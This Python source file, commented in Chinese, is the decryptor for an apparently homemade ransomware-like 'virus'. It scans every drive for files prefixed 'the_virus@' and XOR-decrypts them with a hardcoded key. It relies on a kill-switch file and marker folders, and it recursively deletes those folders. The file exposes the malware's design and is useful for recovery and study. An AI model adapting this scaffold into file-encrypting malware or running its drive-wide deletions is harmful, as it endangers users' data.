#这是解密程序
import os, string, threading, shutil

def key_path():
	"""需要创建并用作判断的文件或文件夹的路径"""
	change_name = os.path.expanduser('~')						#得到通用路径c:\users\用户名
	key_path_1 = r'%s\Documents\System' %(change_name)				#第一个目标路径
	key_path_2 = r'%s\Pictures\下载的图片' %(change_name)				#第二个目标路径
	key_path_3 = r'%s\Videos\Download' %(change_name)				#第三个目标路径
	return key_path_1, key_path_2, key_path_3					#返回三个路径并存至列表


def aims_path(the_aim):
	"""递归遍历文件目录和所有文件,如
	果是文件则进行加密操作"""
	try:
		files = os.listdir(the_aim)						#遍历目标路径并将其存在列表中	
		for file in files:							#遍历列表
			new_path = os.path.join(the_aim, file)				#拼接成新路径
			if os.path.isdir(new_path):					#判断是否是文件夹
				aims_path_thread = threading.\
				Thread(target=aims_path, args=(new_path,))		#以aims_path函数创建线程对象
				aims_path_thread.start()				#启动线程对象
			else:								#否则则为文件
				file_name = os.path.split(new_path)			#拆分文件名和扩展名并放入列表
				answer = file_name[1]					#得到目标文件名
				if answer[:10] == 'the_virus@':				#将文件名的前9个字符和'the_virus@'比较
					encryption_thread = threading.\
					Thread(target=encryption, args=(new_path,)) 	#以encryption函数创建线程对象		
					encryption_thread.start()			#启动线程对象
				else: 							#否则未被加密
					pass
	except Exception:
		pass

def encryption(file_path):
	"""用于解密文件的代码块"""
	try:									
		key_date = b'He who makes no mistakes makes nothing. --2021/1/17'					
		len_key_date = 51
		key_name = 'the_virus@'							
		answer = os.path.split(file_path)					
		new_name = os.path.join(answer[0], answer[1][10:])				
		the_full_path = new_name						
		with open(file_path, 'rb') as f:
			with open(the_full_path, 'wb') as w:					
				while 1:
					stream_bytes = f.read(1024)
					if not stream_bytes:
						break
					else:
						len_stream_bytes = len(stream_bytes)										
						finally_key = len_stream_bytes // 51 *\
						key_date + key_date[:len_stream_bytes % 51]								
						for i in range(len_stream_bytes):				
							new_stream_bytes = finally_key[i] ^ stream_bytes[i]	
							w.write(bytes([new_stream_bytes]))
		os.remove(file_path)
	except Exception:
		pass

def get_disklist():
	'''获得计算机所有盘符'''
	disk_list = []									#创建一个空列表用于存储盘符
	for i in string.ascii_uppercase:						#遍历ascii码从中得到值
		disk = i + ':'								#和':'进行拼接得到盘符
		if os.path.isdir(disk):							#判断是否是盘符文件夹
			disk_list.append(disk)						#如果是盘符则将其追加到列表中
	disk_list.sort(reverse = True)							#逆序排列盘符
	return disk_list								#返回存储了盘符的列表以备使用
	
#启动/主函数
def main():								#防止调用此模块时自动启动主函数
	Safety_inspection = r"C:\Windows\Password.txt"  				#用于安全检测的路径
	key_answer = key_path()								#得到存储目标路径的列表
	key_file_1 = key_answer[0] 							#第一个目标路径
	key_file_3 = key_answer[2]							#第三个目标路径
	answer = os.path.exists(Safety_inspection)					#得到检测的答案
	answer_1 = os.path.exists(key_file_1)						#判断是否存在第一个路径
	answer_3 = os.path.exists(key_file_3)						#判断是否存在第三个路径
	if answer == True:								#如果是自己的计算机
		pass									#跳过不执行操作
	elif answer_1 == False and answer_3 == False:					#如果第一和第三个文件夹同时不存在
		pass									#不执行操作
	else:										#否则
		disk_lists = get_disklist()						#得到计算机所有盘符的列表
		for disk_list in disk_lists:						#遍历列表得到单个盘符
			aims_path(disk_list) 						#执行递归遍历和解密操作
	if answer_1 == True:								#如果存在第一个路径
		shutil.rmtree(key_file_1)						#删除文件夹和其子文件
	if answer_3 == True:								#如果存在第三个路径
		shutil.rmtree(key_file_3)						#删除文件夹和其子文件

if __name__ == '__main__':
	pass